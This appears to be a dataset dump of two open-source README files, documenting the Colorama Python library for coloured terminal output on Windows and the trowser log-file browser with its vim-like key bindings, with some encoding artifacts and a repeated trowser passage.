    Thomas Weininger for fixing ValueError on Windows

    Remi Rampin for better Github integration and fixes to the README file

    Simeon Visser for closing a file handle using â€˜withâ€™ and updating classifiers to include Python 3.3 and 3.4

    Andy Neff for fixing RESET of LIGHT_EX colors.

    Jonathan Hartley for the initial idea and implementation.

","
Description du projet
Latest Version Supported Python versions Build Status
Colorama

Makes ANSI escape character sequences (for producing colored terminal text and cursor positioning) work under MS Windows.

PyPI for releases | Github for source | Colorama for enterprise on Tidelift

If you find Colorama useful, please Donate with Paypal to the authors. Thank you!
Installation

Tested on CPython 2.7, 3.7, 3.8, 3.9 and 3.10 and Pypy 2.7 and 3.8.

No requirements other than the standard library.

pip install colorama
# or
conda install -c anaconda colorama

Description

ANSI escape character sequences have long been used to produce colored terminal text and cursor positioning on Unix and Macs. Colorama makes this work on Windows, too, by wrapping stdout, stripping ANSI sequences it finds (which would appear as gobbledygook in the output), and converting them into the appropriate win32 calls to modify the state of the terminal. On other platforms, Colorama does nothing.

This has the upshot of providing a simple cross-platform API for printing colored terminal text from Python, and has the happy side-effect that existing applications or libraries which use ANSI sequences to produce colored output on Linux or Macs can now also work on Windows, simply by calling colorama.just_fix_windows_console() (since v0.4.6) or colorama.init() (all versions, but may have other side-effects â€“ see below).

An alternative approach is to install ansi.sys on Windows machines, which provides the same behaviour for all applications running in terminals. Colorama is intended for situations where that isnâ€™t easy (e.g., maybe your app doesnâ€™t have an installer.)

Demo scripts in the source code repository print some colored text using ANSI sequences. Compare their output under Gnome-terminalâ€™s built in ANSI handling, versus on Windows Command-Prompt using Colorama:
ANSI sequences on Ubuntu under gnome-terminal. Same ANSI sequences on Windows, using Colorama.

These screenshots show that, on Windows, Colorama does not support ANSI â€˜dim textâ€™; it looks the same as â€˜normal textâ€™.
Usage
Initialisation

If the only thing you want from Colorama is to get ANSI escapes to work on Windows, then run:

from colorama import just_fix_windows_console
just_fix_windows_console()

If youâ€™re on a recent version of Windows 10 or better, and your stdout/stderr are pointing to a Windows console, then this will flip the magic configuration switch to enable Windowsâ€™ built-in ANSI support.

If youâ€™re on an older version of Windows, and your stdout/stderr are pointing to a Windows console, then this will wrap sys.stdout and/or sys.stderr in a magic file object that intercepts ANSI escape sequences and issues the appropriate Win32 calls to emulate them.

In all other circumstances, it does nothing whatsoever. Basically the idea is that this makes Windows act like Unix with respect to ANSI escape handling.

Itâ€™s safe to call this function multiple times. Itâ€™s safe to call this function on non-Windows platforms, but it wonâ€™t do anything. Itâ€™s safe to call this function when one or both of your stdout/stderr are redirected to a file â€“ it wonâ€™t do anything to those streams.

Alternatively, you can use the older interface with more features (but also more potential footguns):

from colorama import init
init()

This does the same thing as just_fix_windows_console, except for the following differences:

    Itâ€™s not safe to call init multiple times; you can end up with multiple layers of wrapping and broken ANSI support.

    Colorama will apply a heuristic to guess whether stdout/stderr support ANSI, and if it thinks they donâ€™t, then it will wrap sys.stdout and sys.stderr in a magic file object that strips out ANSI escape sequences before printing them. This happens on all platforms, and can be convenient if you want to write your code to emit ANSI escape sequences unconditionally, and let Colorama decide whether they should actually be output. But note that Coloramaâ€™s heuristic is not particularly clever.

    init also accepts explicit keyword args to enable/disable various functionality â€“ see below.

To stop using Colorama before your program exits, simply call deinit(). This will restore stdout and stderr to their original values, so that Colorama is disabled. To resume using Colorama again, call reinit(); it is cheaper than calling init() again (but does the same thing).

Most users should depend on colorama >= 0.4.6, and use just_fix_windows_console. The old init interface will be supported indefinitely for backwards compatibility, but we donâ€™t plan to fix any issues with it, also for backwards compatibility.
Colored Output

Cross-platform printing of colored text can then be done using Coloramaâ€™s constant shorthand for ANSI escape sequences. These are deliberately rudimentary, see below.

from colorama import Fore, Back, Style
print(Fore.RED + 'some red text')
print(Back.GREEN + 'and with a green background')
print(Style.DIM + 'and in dim text')
print(Style.RESET_ALL)
print('back to normal now')

â€¦or simply by manually printing ANSI sequences from your own code:

print('\033[31m' + 'some red text')
print('\033[39m') # and reset to default color

â€¦or, Colorama can be used in conjunction with existing ANSI libraries such as the venerable Termcolor the fabulous Blessings, or the incredible _Rich.

If you wish Coloramaâ€™s Fore, Back and Style constants were more capable, then consider using one of the above highly capable libraries to generate colors, etc, and use Colorama just for its primary purpose: to convert those ANSI sequences to also work on Windows:

SIMILARLY, do not send PRs adding the generation of new ANSI types to Colorama. We are only interested in converting ANSI codes to win32 API calls, not shortcuts like the above to generate ANSI characters.

from colorama import just_fix_windows_console
from termcolor import colored

# use Colorama to make Termcolor work on Windows too
just_fix_windows_console()

# then use Termcolor for all colored text output
print(colored('Hello, World!', 'green', 'on_red'))

Available formatting constants are:

Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Style: DIM, NORMAL, BRIGHT, RESET_ALL

Style.RESET_ALL resets foreground, background, and brightness. Colorama will perform this reset automatically on program exit.

These are fairly well supported, but not part of the standard:

Fore: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX
Back: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX

Cursor Positioning

ANSI codes to reposition the cursor are supported. See demos/demo06.py for an example of how to generate them.
Init Keyword Args

init() accepts some **kwargs to override default behaviour.

init(autoreset=False):

    If you find yourself repeatedly sending reset sequences to turn off color changes at the end of every print, then init(autoreset=True) will automate that:

    from colorama import init
    init(autoreset=True)
    print(Fore.RED + 'some red text')
    print('automatically back to default color again')

init(strip=None):

    Pass True or False to override whether ANSI codes should be stripped from the output. The default behaviour is to strip if on Windows or if output is redirected (not a tty).
init(convert=None):

    Pass True or False to override whether to convert ANSI codes in the output into win32 calls. The default behaviour is to convert if on Windows and output is to a tty (terminal).
init(wrap=True):

    On Windows, Colorama works by replacing sys.stdout and sys.stderr with proxy objects, which override the .write() method to do their work. If this wrapping causes you problems, then this can be disabled by passing init(wrap=False). The default behaviour is to wrap if autoreset or strip or convert are True.

    When wrapping is disabled, colored printing on non-Windows platforms will continue to work as normal. To do cross-platform colored output, you can use Coloramaâ€™s AnsiToWin32 proxy directly:

    import sys
    from colorama import init, AnsiToWin32
    init(wrap=False)
    stream = AnsiToWin32(sys.stderr).stream

    # Python 2
    print >>stream, Fore.BLUE + 'blue text on stderr'

    # Python 3
    print(Fore.BLUE + 'blue text on stderr', file=stream)

Recognised ANSI Sequences

ANSI sequences generally take the form:

ESC [  ;  ... 

Where  is an integer, and  is a single letter. Zero or more params are passed to a . If no params are passed, it is generally synonymous with passing a single zero. No spaces exist in the sequence; they have been inserted here simply to read more easily.

The only ANSI sequences that Colorama converts into win32 calls are:

ESC [ 0 m       # reset all (colors and brightness)
ESC [ 1 m       # bright
ESC [ 2 m       # dim (looks same as normal brightness)
ESC [ 22 m      # normal brightness

# FOREGROUND:
ESC [ 30 m      # black
ESC [ 31 m      # red
ESC [ 32 m      # green
ESC [ 33 m      # yellow
ESC [ 34 m      # blue
ESC [ 35 m      # magenta
ESC [ 36 m      # cyan
ESC [ 37 m      # white
ESC [ 39 m      # reset

# BACKGROUND
ESC [ 40 m      # black
ESC [ 41 m      # red
ESC [ 42 m      # green
ESC [ 43 m      # yellow
ESC [ 44 m      # blue
ESC [ 45 m      # magenta
ESC [ 46 m      # cyan
ESC [ 47 m      # white
ESC [ 49 m      # reset

# cursor positioning
ESC [ y;x H     # position cursor at x across, y down
ESC [ y;x f     # position cursor at x across, y down
ESC [ n A       # move cursor n lines up
ESC [ n B       # move cursor n lines down
ESC [ n C       # move cursor n characters forward
ESC [ n D       # move cursor n characters backward

# clear the screen
ESC [ mode J    # clear the screen

# clear the line
ESC [ mode K    # clear the line

Multiple numeric params to the 'm' command can be combined into a single sequence:

ESC [ 36 ; 45 ; 1 m     # bright cyan text on magenta background

All other ANSI sequences of the form ESC [  ;  ...  are silently stripped from the output on Windows.

Any other form of ANSI sequence, such as single-character codes or alternative initial characters, are not recognised or stripped. It would be cool to add them though. Let me know if it would be useful for you, via the Issues on GitHub.
Status & Known Problems

Iâ€™ve personally only tested it on Windows XP (CMD, Console2), Ubuntu (gnome-terminal, xterm), and OS X.

Some valid ANSI sequences arenâ€™t recognised.

If youâ€™re hacking on the code, see README-hacking.md. ESPECIALLY, see the explanation there of why we do not want PRs that allow Colorama to generate new types of ANSI codes.

See outstanding issues and wish-list: https://github.com/tartley/colorama/issues

If anything doesnâ€™t work for you, or doesnâ€™t do what you expected or hoped for, Iâ€™d love to hear about it on that issues list, would be delighted by patches, and would be happy to grant commit access to anyone who submits a working patch or two.
License

Copyright Jonathan Hartley & Arnon Yaari, 2013-2020. BSD 3-Clause license; see LICENSE file.
Professional support

Tidelift
	

Professional support for colorama is available as part of the Tidelift Subscription. Tidelift gives software development teams a single source for purchasing and maintaining their software, with professional grade assurances from the experts who know it best, while seamlessly integrating with existing tools.
Thanks

See the CHANGELOG for more thanks!

    Marc Schlaich (schlamar) for a setup.py fix for Python2.5.

    Marc Abramowitz, reported & fixed a crash on exit with closed stdout, providing a solution to issue #7â€™s setuptools/distutils debate, and other fixes.

    User â€˜eryksunâ€™, for guidance on correctly instantiating ctypes.windll.

    Matthew McCormick for politely pointing out a longstanding crash on non-Win.

    Ben Hoyt, for a magnificent fix under 64-bit Windows.

    Jesse at Empty Square for submitting a fix for examples in the README.

    User â€˜jamesspâ€™, an observant documentation fix for cursor positioning.

    User â€˜vaal1239â€™, Dave Mckee & Lackner Kristof for a tiny but much-needed Win7 fix.

    Julien Stuyck, for wisely suggesting Python3 compatible updates to README.

    Daniel Griffith for multiple fabulous patches.

    Oscar Lesta for a valuable fix to stop ANSI chars being sent to non-tty output.

    Roger Binns, for many suggestions, valuable feedback, & bug reports.

    Tim Golden for thought and much appreciated feedback on the initial idea.

    User â€˜Zearinâ€™ for updates to the README file.

    John Szakmeister for adding support for light colors

    Charles Merriam for adding documentation to demos

    Jurko for a fix on 64-bit Windows CPython2.5 w/o ctypes

    Florian Bruhin for a fix when stdout or stderr are None

    Thomas Weininger for fixing ValueError on Windows

    Remi Rampin for better Github integration and fixes to the README file

    Simeon Visser for closing a file handle using â€˜withâ€™ and updating classifiers to include Python 3.3 and 3.4

    Andy Neff for fixing RESET of LIGHT_EX colors.

    Jonathan Hartley for the initial idea and implementation.

",tartley/colorama
trowser,https://github.com/tomzox/trowser,0,24794,24786,"trowser := Trace Browser
========================

Description
-----------

*Trowser* is a graphical browser for large line-oriented text files with color highlighting and a highly flexible search and cherry-picking window. Trowser was developed as an alternative to UNIX-tool ""less"" when analyzing debug log files (aka traces - hence the name).

Trowser has a graphical interface, but is designed to allow browsing via the keyboard at least to the same extent as less. Key bindings and the cursor positioning concept are derived from vim.

Note in this context ""line-oriented"" denotes that each line of text is considered a data unit.  Color highlighting (including search matches) will always apply the highlight to a complete line of text.

When you start trowser for the first time, you'll have to create highlight patterns for your type of file.  To do this, first enter a search pattern and verify that it matches the intended lines. Then open the *Edit highlight patterns* dialog in the *Search* menu, press the right mouse button to open the context menu and select *Add current search*. You can change the highlight color or select a different kind of mark-up by double-clicking on the new entry in the dialog, or by selecting *Edit markup* in the context menu.  To define new colors, click on *Edit color palette* at the bottom of the markup editor dialog.

There are several ways to quickly navigate in the file to lines matching search patterns: Firstly, you can search forwards or backwards to any sub-string or pattern you enter in the *Find:* field. Secondly, you can repeat previous searches by opening the search history dialog and double-clicking on an entry, or by clicking *Next* or *Previous*. Third, you can assign bookmarks to selected text lines and jump in-between those lines by clicking on them in the bookmark list dialog or via ``'+`` and ``'-`` key bindings (not in vim.) Fourth, you can search for patterns defined in the color highlight list by selecting a pattern in the list and then clicking on *Next* or *Previous* in the pattern list dialog. Fifth, you can open the *Search result list* (via the *Search* menu or by clicking on *List all* in any dialog or by entering ``ALT-a``) to display all text lines which match a set of patterns and click on an entry in this list to jump to the respective line in the main window. Sixth, you can manually copy arbitrary lines from the main text window into the search result window via the ``'i'`` key (not in vim.)

The search filter list is one of the main features of the trace browser, as it allows to consecutively build an arbitrary sub-set of text lines in the main window. You can not only use one or more search patterns to add text, but also add selected text lines from the main text window via the ``i`` key binding and remove individual lines again, either manually or by use of a search pattern.  Additionally you can use bookmarks in the search result window. When searching in the main window, the search result list will scroll to show the same region of text. Thus you effectively can navigate the text on three levels: Bookmarks > Search list > Main text.

Both the bookmark and search result lists support prefixing all entries with a ""frame number"". This is useful when your input file does not have time-stamp prefixes on each line. In this case trowser can search for a preceding time-stamp and automatically prefix bookmarked lines with this number.  Additionally trowser allows to fetch a ""frame number"" which is not printed in the same line as the frame interval start line. In this case trowser searches the next frame start lines in forward and backward direction and then inside of that range for a line containing the frame number value.  Note for the search result list this feature is disabled by default for performance reasons. It must be enabled in the dialog's *Options* menu. The search patterns used to locate time-stamps currently have to be inserted into the RC file manually.

For performance reasons most search-related commands are executed as background processes, so that the GUI remains responsive during search. For example, this applies to the initial color highlighting, global search highlighting, incremental search while editing search patterns and filling the search result list.  Such background activity is indicated by display of a progress bar and switching the mouse cursor to a watch or hourglass image.  You still can use trowser as usual during this time though.  The background activity is automatically aborted or restarted when a conflicting command is entered (e.g. when the search pattern is modified during global search highlighting.)

Key bindings
------------

Generally, keyboard focus can be moved between control elements (e.g. buttons, check-boxes and text containers) using the *TAB* or *Shift-TAB*.  The widget with the keyboard focus is marked by a black border.  After start-up, keyboard focus is in the main text window.  Functions which are bound to mouse clicks on buttons etc. can be activated via the keyboard using the *Space* bar. Many functions can also be activated via shortcuts: Press the *ALT* key plus the character which is underlines in the button description (e.g. Press ``ALT-c`` to open the *Control* menu, or ``ALT-a`` to simulate a mouse-click on the *All* button at the bottom of the main window.)

In the following descriptions, ``^X`` means *Control-X*, i.e. holding the Control key pressed while pressing the ``X`` key. *ALT* refers to the key to the left of the *Space* bar.  Enclosing quotes must be typed.

Key Bindings in the Main Window
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The commands in this section can be used when the keyboard focus is in the main window.

Commands to move the cursor or change the view:

*Up*, *Down*, *Left*, *Right*
  Move the cursor in the respective direction. When the cursor hits the end of the visible area (i.e. the view), the text is scrolled vertically by a line or horizontally by a character (same as in vim, except for the smoother horizontal scrolling)

*Control-Up*, *Control-Down*, *Control-Left*, *Control-Right*
  Scroll the view by a line or character in the respective direction (not in vim - unless you have added ""map <C-Down> ^E"" etc. in *.vimrc*)

``h``, ``l``, ``k``, ``j``
  Move the cursor left, right, up or down (same as in vim)

*Return*, ``+``, ``-``
  Move the cursor to the start of the following or preceding line (to be exact: the first non-blank character) (same as in vim)

*Space*, *BackSpace*
  Move the cursor to the next or preceding character (same as in vim)

*Home*, *End*, ``0``, ``$``, ``^``
  Move the cursor to the first or last character of the current line (same as in vim)

*Control-Home*, *Control-End*, ``G``, ``gg``
  Move the cursor to the start or end of the file (same as in vim) Note an equivalent alternative to ``gg`` is ``1g``.

``H``, ``M``, ``L``
  Move the cursor to the start of the line at the top, middle or bottom of the view (same as in vim)

``w``, ``e``, ``b``, ``W``, ``E``, ``B``, ``ge``, ``gE``
  Move the cursor to the start or end of the next or preceding word (same as in vim)

``^e``, ``^y``, ``^d``, ``^u``, ``^f``, ``^b``
  Scroll the screen by a single line, half a screen or a full screen forwards or backwards (same as in vim)

``z``\ *Return*, ``z.``, ``z-``
  Adjusts the view vertically so that the current line is at the top, middle or bottom of the screen and places the cursor on the first non-blank character (same as in vim)  The horizontal view is set to start at the left border.

``zt``, ``zz``, ``zb``
  Adjusts the view so that the current line is at the top, middle or bottom of the screen; the cursor position is unchanged (same as in vim)

``zl``, ``zh``, ``zL``, ``zH``
  Move the view horizontally to the left or right (same as in vim)

``zs``, ``ze``
  Scroll the view horizontally so that the current cursor column is placed at the left or the right side of the screen (as far as possible); in any case the cursor position remains unchanged (same as in vim)

``f``, ``F``
  Search for the following character in the same line to the right or left respectively (same as in vim)

``;``, ``,`` (semicolon, comma)
  Repeat a previous in-line search (\ ``f`` or ``F``) in the same or opposite direction respectively (same as in vim)

``''`` (two apostrophes)
  Moves the cursor to the position before the latest jump (same as in vim and less.)  A ""jump"" is one of the following commands: ``'``, ``G``, ``/``, ``?``, ``n``, ``N``, ``L``, ``M`` and ``H`` (same as in vim.)  Note movements controlled via the GUI, such as the bookmark list or search result list, do not modify the jump list.

``'+``, ``'-``
  Moves the cursor to the next or previous bookmark (not in vim)

``'^``, ``'$``
  Moves the cursor to the start or end of file (same as in less; not in vim)

``^o``, ``^i``
  Moves the cursor to the next older (or newer respectively) position in the jump list (same as in vim; note ``TAB`` which is identical to ``^i`` in vim has a different meaning here.) See ``''`` for a list of commands which are considered jumps and add pre-jump cursor positions to the list.

``1``, ``2``, ... ``9``
  A number without leading zeroes can be used to repeat the subsequent key command or place the cursor on a given line or column (same as in vim)

  For example: ``1G`` places the cursor in the first line of the file; ``10|`` places the cursor in the tenth column of the current line (line and column numbering starts at 1.)  Note the number cannot start with zero, as ``0`` is treated specially (immediately moves the cursor into the first column, same as in vim.)

Searching and repeating:

``/``, ``?``
  Search for the following pattern (same as in vim.) Similar to vim, the keyboard focus is moved from the main text into a small text entry field (command line in vim) Note the previous search pattern is always cleared when re-entering the entry field, but all previously used patterns are still available in the history which can be accessed with the cursor up/down keys like in vim. Note in addition, you can use ``^d`` in the search field to copy the text under the cursor in the main window into the search field, word by word.

  As soon as a search expression is typed into the field, an incremental search is started and matching lines are highlighted. The cursor in the main text isn't actually moved there until the search is completed by pressing ``Return``.  The search can be aborted by ``^C`` or ``Escape``. For more details see `Key bindings in the search entry field`_.

``n``, ``N``
  Repeats the previous search in forward or backwards direction respectively (similar to vim - however in contrary to vim ``n`` always searches forward and ``N`` always backwards because the standard vim behavior of remembering and reversing the search direction with ``N`` is very confusing.)

``*``, ``#``
  Searches for the word under the cursor in forward or backwards direction respectively (same as in vim)  Note when regular expression search mode is not enabled, this command performs a plain sub-string text search. Else, word boundary matches are placed around the search text, as done by vim.

``&``
  Remove the highlighting of previous search matches (not in vim as such, but can be added via ``map & :nohlsearch^M`` in *.vimrc*)  Note this does not disable highlighting in subsequent searches.

*ALT-* ``f``
  Moves the focus in the search search entry field.  This is equivalent to ``/`` or ``?`` but without changing the search direction (not in vim) This is equivalent to clicking into the ""Find:"" entry field with the mouse button.

*ALT-* ``n``, *ALT-* ``p``
  Repeat a previous search, equivalent to ``n`` and ``N`` (not in vim)

*ALT-* ``h``
  Enable the ""Highlight all"" option, i.e. highlight all lines in the text where the current search pattern matches (not in vim)

*ALT-* ``a``
  Open the search result window and fill it with all text lines which match the current search pattern (not in vim)

*ALT-* ``N``, *ALT-* ``P``
  Open the search result window and fill it with all text lines below or above the current cursor position respectively which match the current search pattern (not in vim)

The following commands can be used to change the selection.

Note that selected text is automatically exported and can be pasted into other applications.

*Shift-Left*, *Shift-Right*, *Shift-Up*, *Shift-Down*
  Starts or extends the selection in the respective direction (not in vim) Note that trowser only supports the character-wise selection mode (like ``v`` in vim)

*Shift-Home*, *Shift-End*
  Starts or extends the selection from the current cursor position to the start or end of the current line (not in vim)

*Control-Shift-Home*, *Control-Shift-End*
  Starts or extends the selection from the current cursor position to the start or end of the file (not in vim)

``^c``
  Copies the currently selected text to the clipboard.  (Note that this command is actually superfluous as the text is copied as soon as some text is selected.)

Misc. commands (none of these are in vim):

``m``
  This key, or double-clicking into a text line, toggles a bookmark in the respective line (different from vim; note setting named bookmarks is not supported.)  Additionally the view of the search result list, if open, will be centered around the line (even if the marked line is not included in the search results.)

``i``
  Insert (i.e. copy) the text line holding the cursor into the search result window. If a selection exists and is currently visible, the selected lines are copied instead. (Note the restriction to visibility of the selection exists to avoid confusion about ``i`` not working on the current text line.)

``u``, ``^r``
  Undo or redo respectively the last addition or removal of text lines in the search list done by ``i`` or ""Search All"" (different from vim.)

*ALT-* ``+``, *ALT-* ``-``
  Increases or decreases the font size for the text content. Note the behavior when reaching the maximum or minimum font size is undefined.

*ALT-* ``w``
  Toggle line-wrap for text in the main window (i.e. text lines which are longer than the window width will wrap into the next line.)

Key Bindings in the Search Entry Field
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The following commands can be used when the keyboard focus is in the **search entry field** at the bottom of the main window:

*Return*
  Store the current pattern in the search history and return focus to the main window with the cursor on the next match (same as vim)   Note the cursor is already moved via incremental search when entering the text (including the highlighting of adjacent matches) so the search and cursor movement need not be done again here.  This command is equivalent to leaving the search field by clicking with the mouse outside or switching keyboard focus via *TAB* or *Shift-TAB*.

*Escape*, ``^c``
  Abort the current search, i.e. return focus to the main window and place the cursor on the previous position. The search pattern in the entry field is still pushed onto the history (same as in vim.)

``^a``, ``^e``
  Move the insertion cursor to the start or end of the search text entry field (\ ``^e`` is same as in vim; ``^a`` is not in vim.)  Note: movement and selection via cursor keys works in the same way as described for the main text.

``^n``, ``^N``
  Jump to the next or previous match respectively for the current pattern using incremental search.  Note these commands do not affect the fall-back cursor position, i.e. when the search is aborted or the pattern is changed, the cursor returns to the original start position (not in vim)

*Up*, *Down*
  Copies the previous or next pattern in the search history into the entry field. If the entry field already contains some text, the search is restricted to patterns with the same prefix.

``^d``, ``^D``
  Complete the search text with the text to the right or left of the current match in the main text (i.e. right or left of the text marked with green background color.)

``^x``
  Remove the currently used pattern in the search history, if the current pattern was copied by use of *Up* or *Down* (not in vim)

*ALT-* ``n``, *ALT-* ``p``
  Same as pressing the *Next* or *Previous* buttons respectively, i.e. search for the current pattern in forward or backwards direction and add the pattern to the search history. Keyboard focus remains in the search entry field.

*ALT-* ``a``
  Open the search result window and fill it with all text lines which match the current search pattern (not in vim)  Additionally, keyboard focus is moved back into the main window.

*ALT-* ``N``, *ALT-* ``P``
  Open the search result window and fill it with all text lines below or above the current cursor position respectively which match the current search pattern (not in vim)  Additionally, the keyboard focus is moved back into the main window.

*ALT-* ``c``
  Toggle the ""match case"" option, i.e. equivalent to clicking on *Match case* (not in vim)

*ALT-* ``e``
  Toggle the regular expression search option, i.e. equivalent to clicking on button *Reg.Exp.* (not in vim.)  When this option is enabled, special characters are parsed according to *re_syntax* Tcl manual page; the syntax is almost identical to Perl with few exceptions (notably ``\m`` and ``\M`` to match beginning and end of words)  When the option is not enabled, no characters have a special meaning (i.e. even ""\ ``*``"") and a simple sub-string search is started.

  Note: for performance reasons it's recommended to use case-sensitive sub-string searches for color highlighting, especially if you have many patterns. This is usually faster than combining multiple patterns with ``|`` in a regular expression.

Key Bindings in the Search Result Window
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The following commands can be used in the search result window (i.e. the list filled by ""Search All"" and lines copied from the main window via the ``i`` key binding.)

For users who prefer controls via the mouse it should be noted that there's a context menu which opens via a click with the right mouse button into a line, which has equivalent commands to the ones listed below.

``m``
  Bookmark the currently selected line.  The line will be marked both in the search result window and the main window.

*Delete*
  Remove the selected lines from the search result list.

``u``
  Undo the last addition or removal.

``^r``
  Redo the last addition or removal (if previously undone.)

``/``, ``?``
  Moves the keyboard focus in the search entry field in the main window for entering a search expression. The behavior of the search is the same as in the main window. When leaving the search entry field via ``Return`` or ``Escape``, the keyboard focus returns to the search list.

``n``, ``N``
  Repeat the last search in downwards or upwards direction respectively. The search is restricted to lines in the search result window.

*Escape*
  Abort an ongoing search. Lines which were already found and added to the search result window will remain. (You can still remove these lines using ""undo"".)

``&``
  Same as in the main window: Remove the highlighting of previous search matches (same as ``:nohlsearch`` in vim) and of lines highlighted in the main window by positioning via selections in the search result list.

In addition to the above, the general selection dialog key bindings in the next section also work in the search result window.

Key Bindings in Dialogs
~~~~~~~~~~~~~~~~~~~~~~~

The following commands can be used to manipulate the selection cursor in all dialogs which display lists (i.e. search result list, search history, bookmarks, highlight pattern editor)  Note there's no distinction between selection and cursor in these dialogs. This means you cannot move the selection cursor from line A to D using the keyboard without temporarily selecting lines B and C in-between.

Of course you can also manipulate the selection via the mouse in the usual ways, i.e. clicking on single entries, or dragging the mouse to select multiple elements, or pressing the mouse while holding Control or Shift keys pressed to add or remove single elements or extend the selection respectively.

*Up*, *Down*
  Move the selection cursor one line up or down respectively, scrolling the view if necessary.  If no line is selected yet, the cursor is placed on the first or last line; if the previously selected line is still in the visible area, the cursor is placed there instead.

*Home*, *End*
  Move the selection cursor on the first or last item in the list.

*Shift-Up*, *Shift-Down*, *Shift-Home*, *Shift-End*
  Extend or reduce the selection in the given direction, or to the start or end of the list.

*Page-Up*, *Page-Down*
  Scroll the view up or down by a page. These commands remove the selection cursor.

Options
-------

The following command line options are available:

**-h** *limit*, **--head=limit**
  This option specifies the maximum number of bytes read from the start of the input file or stream, i.e. any following text is silently ignored.

  The limit value is remembered in the configuration file and used in the next invocation unless overridden.  When neither **-h** or **-t** are specified and data is loaded from a stream via STDIN, a small dialog window pops up when the buffer limit is exceeded. This allows the user to select between head and tail modes manually.

**-t** *limit*, **--tail=limit**
  This option specifies the maximum number of bytes to be read into the display buffer.  If the input is a file which is larger then the given buffer limit, text at the beginning of the file is skipped. If the input is a stream, all data is read into a temporary queue until the end-of-stream is reached; then the last *limit* number of bytes which were read from the stream are loaded into the display buffer.

  The limit value is remembered in the configuration file and used in the next invocation unless overridden.

**-r** *path*, **--rcfile=path**
  This option can be used to specify an alternate configuration file. When this option is not present, the configuration file is stored in the home directory, see section FILES.

Environment
-----------

**trowser** only evaluates the standard variables **DISPLAY** (X11 display address) and **HOME** (home directory, for storing the configuration file.)

Files
-----

**$HOME/.config/trowser/trowser.py.rc**
  *UNIX*: Configuration file where all personal settings and the search history are stored. Per default this file is created in your home directory, but a different path and file name can be specified with the **--rcfile** option (see `Options`_).

  During updates to this file, trowser temporarily creates a file called ``.trowserc.XXXXX.tmp`` in the home directory, where ""XXXXX"" is a random number. The old file is then replaced with this new file. This procedure will obviously fail if your home directory is not writable.

Caveats
-------

Currently only one pattern list for color highlighting is supported. Hence different highlighting for different file types can only be done by choosing different configuration files when starting trowser (see the *--rcfile* option.)

Vim compatibility: Not all vim navigation commands are implemented; Command repetition is supported only for a small sub-set of commands; Some commands behave slightly differently from vim (most notably the bookmark related commands.) vim's range and selection commands are not supported at all.

Search repetition by pressing ""Next"" or ""Previous"" or the search history dialog is currently not interruptable and may take quite a while if the next match is several MB away. (This can be avoided by repeating the search via the entry field's internal search history, i.e. ``/`` and *Up*)

Searching with regular expressions is very slow in large files. This is unfortunately a property of the ""text"" Tk widget. Thus use of regular expressions for highlighting is not recommended. (As a work-around, trowser automatically falls back to plain string search if there are no control characters in the search expression.)

Some GUI activity (e.g. selecting a range on text with the mouse) will render active background tasks uninteruptable, i.e. the GUI will become unresponsive until the background task has completed.

File store and load dialogs do not maintain a history of previously used files or directories. (This is so because it's expected that these features will not be used very often.)

The pipe load and search result list dialogs are not designed very well yet (i.e. even more so than the other dialogs). Suggestions for improvements are welcome.

Some configuration options cannot be modified via the GUI and require manually editing the configuration file.




","trowser := Trace Browser
========================

Description
-----------

*Trowser* is a graphical browser for large line-oriented text files with color highlighting and a highly flexible search and cherry-picking window. Trowser was developed as an alternative to UNIX-tool ""less"" when analyzing debug log files (aka traces - hence the name).

Trowser has a graphical interface, but is designed to allow browsing via the keyboard at least to the same extent as less. Key bindings and the cursor positioning concept are derived from vim.

Note in this context ""line-oriented"" denotes that each line of text is considered a data unit.  Color highlighting (including search matches) will always apply the highlight to a complete line of text.

When you start trowser for the first time, you'll have to create highlight patterns for your type of file.  To do this, first enter a search pattern and verify that it matches the intended lines. Then open the *Edit highlight patterns* dialog in the *Search* menu, press the right mouse button to open the context menu and select *Add current search*. You can change the highlight color or select a different kind of mark-up by double-clicking on the new entry in the dialog, or by selecting *Edit markup* in the context menu.  To define new colors, click on *Edit color palette* at the bottom of the markup editor dialog.

There are several ways to quickly navigate in the file to lines matching search patterns: Firstly, you can search forwards or backwards to any sub-string or pattern you enter in the *Find:* field. Secondly, you can repeat previous searches by opening the search history dialog and double-clicking on an entry, or by clicking *Next* or *Previous*. Third, you can assign bookmarks to selected text lines and jump in-between those lines by clicking on them in the bookmark list dialog or via ``'+`` and ``'-`` key bindings (not in vim.) Fourth, you can search for patterns defined in the color highlight list by selecting a pattern in the list and then clicking on *Next* or *Previous* in the pattern list dialog. Fifth, you can open the *Search result list* (via the *Search* menu or by clicking on *List all* in any dialog or by entering ``ALT-a``) to display all text lines which match a set of patterns and click on an entry in this list to jump to the respective line in the main window. Sixth, you can manually copy arbitrary lines from the main text window into the search result window via the ``'i'`` key (not in vim.)

The search filter list is one of the main features of the trace browser, as it allows to consecutively build an arbitrary sub-set of text lines in the main window. You can not only use one or more search patterns to add text, but also add selected text lines from the main text window via the ``i`` key binding and remove individual lines again, either manually or by use of a search pattern.  Additionally you can use bookmarks in the search result window. When searching in the main window, the search result list will scroll to show the same region of text. Thus you effectively can navigate the text on three levels: Bookmarks > Search list > Main text.

Both the bookmark and search result lists support prefixing all entries with a ""frame number"". This is useful when your input file does not have time-stamp prefixes on each line. In this case trowser can search for a preceding time-stamp and automatically prefix bookmarked lines with this number.  Additionally trowser allows to fetch a ""frame number"" which is not printed in the same line as the frame interval start line. In this case trowser searches the next frame start lines in forward and backward direction and then inside of that range for a line containing the frame number value.  Note for the search result list this feature is disabled by default for performance reasons. It must be enabled in the dialog's *Options* menu. The search patterns used to locate time-stamps currently have to be inserted into the RC file manually.

